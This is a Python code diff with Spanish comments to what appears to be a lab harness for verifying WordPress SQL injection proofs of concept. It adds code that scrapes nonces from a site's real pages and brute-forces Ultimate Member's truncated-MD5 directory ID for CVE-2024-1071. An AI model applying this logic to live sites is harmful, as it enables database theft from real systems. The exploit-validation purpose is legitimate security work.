@@ -33,6 +33,7 @@ from __future__ import annotations
 
 import io
 import json
+import hashlib
 import os
 import re
 import secrets
@@ -143,6 +144,41 @@ def _scrape_nonce_candidates(html: str) -> list:
             if v not in found:
                 found.append(v)
     return found
+
+
+def _list_real_page_urls(lab, limit: int = 12) -> list:
+    """Enumera las paginas REALES y ya publicadas del sitio (incluidas las que un plugin crea
+    automaticamente al activarse -- confirmado en vivo, Ultimate Member/CVE-2024-1071: crea
+    'Account'/'Members'/'Register'/'Login'/... en sus propias slugs, p.ej. '/index.php/register/'
+    -- que el exploit publico real scrapea para sacar el nonce, NO la portada por defecto, que no
+    tiene nada del plugin). Generico: no asume el slug/shortcode concreto de ningun plugin, solo
+    pregunta a WordPress que paginas existen de verdad. Best-effort -- sin wp-cli disponible o sin
+    ninguna pagina, devuelve lista vacia (el llamador sigue con lo que ya tenga, p.ej. la portada)."""
+    try:
+        r = lab.wp_cli("post", "list", "--post_type=page", "--post_status=publish",
+                       "--field=url", "--format=csv", timeout=20)
+        urls = [u.strip() for u in (r.stdout or "").splitlines() if u.strip()]
+        return urls[:limit]
+    except Exception:
+        return []
+
+
+def _discover_hashed_resource_id(probe: Callable[[str], bool], max_n: int = 100) -> Optional[str]:
+    """Algunos plugins no usan IDs de recurso numericos planos sino un hash truncado de un
+    contador secuencial pequeno (ofuscacion, no seguridad real) -- confirmado en vivo, Ultimate
+    Member/CVE-2024-1071: su 'directory_id' real es `md5(str(n))[10:15]` para un n pequeno (el
+    exploit publico de gbrsh lo prueba exactamente asi, n=1..100). `probe(candidato)` debe
+    devolver True si ESE candidato fue ACEPTADO por el servidor (p.ej. la respuesta de control
+    marca exito, no un error de validacion) -- devuelve el primero aceptado, o None si ninguno de
+    los `max_n` candidatos lo fue."""
+    for n in range(1, max_n + 1):
+        cand = hashlib.md5(str(n).encode()).hexdigest()[10:15]
+        try:
+            if probe(cand):
+                return cand
+        except Exception:
+            continue
+    return None
 
 
 def _resolve_endpoint_placeholders(endpoint: str, html_sources: list) -> tuple:
@@ -1910,19 +1946,30 @@ def verify_wordpress_sqli(
                           if any(h in k.lower() for h in ("nonce", "token", "csrf", "security"))
                           and k != sqli_param]
         if re.search(r"\{\w+\}", endpoint or "") or nonce_like_keys:
+            # probar SOLO la portada ('/') no basta -- confirmado en vivo, CVE-2024-1071: el
+            # exploit publico real (gbrsh/secragon) saca el nonce de '/index.php/register/', una
+            # pagina que Ultimate Member crea SOLO EN SU PROPIA activacion, no de la portada por
+            # defecto (que no tiene nada del plugin atacado). En vez de adivinar el slug concreto
+            # de ESTE plugin, se pregunta a WordPress que paginas existen de verdad y se prueban
+            # todas -- generico, funciona igual para cualquier otro plugin que cree sus propias
+            # paginas al activarse.
+            probe_urls = [boot.base_url + "/"]
+            if boot.shortcode_page_path:
+                probe_urls.append(boot.base_url + boot.shortcode_page_path)
+            probe_urls += _list_real_page_urls(lab)
+            seen_urls = set()
+            probe_urls = [u for u in probe_urls if not (u in seen_urls or seen_urls.add(u))]
             html_sources = []
-            for probe_path in ("/", boot.shortcode_page_path or ""):
-                if not probe_path:
-                    continue
+            for u in probe_urls:
                 try:
-                    html_sources.append(boot.sub_sess.get(boot.base_url + probe_path,
-                                                          timeout=15).text or "")
+                    html_sources.append(boot.sub_sess.get(u, timeout=15).text or "")
                 except Exception:
                     pass
             new_endpoint, resolved = _resolve_endpoint_placeholders(endpoint, html_sources)
             if resolved:
                 step(f"endpoint traia placeholder(s) sin resolver {list(resolved)} -- "
-                     f"rellenados con valores reales raspados de una pagina viva del sitio")
+                     f"rellenados con valores reales raspados de entre {len(probe_urls)} "
+                     f"pagina(s) reales del sitio")
                 res.evidence["placeholders_resueltos"] = resolved
             endpoint = new_endpoint
             res.evidence["endpoint_tras_resolver_placeholders"] = endpoint
@@ -1934,9 +1981,64 @@ def verify_wordpress_sqli(
                         base_params[k] = nonces[0]
                         resolved_params[k] = nonces[0]
                     step(f"parametro(s) {list(resolved_params)} parecen nonce/token -- "
-                         f"sustituidos por un valor REAL raspado de una pagina viva del sitio "
-                         f"(el que trajo el PoC/LLM es, como mucho, una adivinanza)")
+                         f"sustituidos por un valor REAL raspado de entre {len(probe_urls)} "
+                         f"pagina(s) reales del sitio (el que trajo el PoC/LLM es, como mucho, "
+                         f"una adivinanza)")
                     res.evidence["parametros_resueltos_con_valor_real"] = resolved_params
+
+        # algunos plugins no usan IDs de recurso numericos planos (el "1" por defecto que
+        # construye base_params) sino un identificador OFUSCADO -- confirmado en vivo, Ultimate
+        # Member/CVE-2024-1071: su 'directory_id' real es un hash MD5 truncado de un contador
+        # pequeno, y sin el valor correcto el servidor nunca llega a ejecutar el query vulnerable
+        # (se queda en la validacion del directorio). Se detecta probando el esquema conocido
+        # SOLO cuando hay un nonce ya resuelto (si no, cualquier candidato fallaria igual por el
+        # nonce, no por el ID) y existe otro parametro con pinta de ID/directorio distinto del
+        # realmente inyectable -- la convencion de WordPress para exito en AJAX
+        # (`wp_send_json_success()` imprime literalmente '"success":true') es generica, no de
+        # este plugin, asi que la deteccion de "aceptado" funciona para cualquier handler que la
+        # use.
+        # el ID ofuscado puede venir como PARAMETRO suelto (base_params) o como placeholder que
+        # _resolve_endpoint_placeholders no pudo rellenar (su heuristico es "el primer numero
+        # plausible en el HTML" -- un hash no es un numero de pocas cifras, nunca lo encuentra) --
+        # confirmado en vivo, CVE-2024-1071: el exploit real trae el endpoint como
+        # '...&directory_id={dir_id}' con 'directory_id' SOLO en la URL, nunca en 'parameters'.
+        other_id_params = [k for k in base_params
+                           if k != sqli_param and k not in nonce_like_keys
+                           and any(h in k.lower() for h in ("id", "dir"))]
+        remaining_placeholders = [ph for ph in re.findall(r"\{(\w+)\}", endpoint or "")
+                                  if any(h in ph.lower() for h in ("id", "dir"))]
+        for k in other_id_params:
+            def _probe_param_id(cand, _k=k):
+                payload = dict(base_params)
+                payload[_k] = cand
+                r = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                          data=payload if m != "GET" else None,
+                                          params=payload if m == "GET" else None, timeout=15)
+                return '"success":true' in (r.text or "")
+            found = _discover_hashed_resource_id(_probe_param_id)
+            if found:
+                base_params[k] = found
+                step(f"parametro '{k}' parece un ID ofuscado -- encontrado un valor "
+                     f"ACEPTADO por el servidor tras probar el esquema de hash truncado "
+                     f"conocido (confirmado en vivo, Ultimate Member/CVE-2024-1071): {found}")
+                res.evidence.setdefault("parametros_resueltos_con_valor_real", {})[k] = found
+        for ph in remaining_placeholders:
+            def _probe_endpoint_id(cand, _ph=ph):
+                cand_endpoint = endpoint.replace("{" + _ph + "}", cand)
+                r = boot.sub_sess.request(m, boot.base_url + cand_endpoint,
+                                          data=dict(base_params) if m != "GET" else None,
+                                          params=dict(base_params) if m == "GET" else None,
+                                          timeout=15)
+                return '"success":true' in (r.text or "")
+            found = _discover_hashed_resource_id(_probe_endpoint_id)
+            if found:
+                endpoint = endpoint.replace("{" + ph + "}", found)
+                step(f"placeholder '{{{ph}}}' del endpoint parece un ID ofuscado -- encontrado "
+                     f"un valor ACEPTADO por el servidor tras probar el esquema de hash "
+                     f"truncado conocido (confirmado en vivo, Ultimate Member/CVE-2024-1071): "
+                     f"{found}")
+                res.evidence.setdefault("placeholders_resueltos", {})[ph] = found
+                res.evidence["endpoint_tras_resolver_placeholders"] = endpoint
 
         orig_value = str(base_params.get(sqli_param) or "1")
 
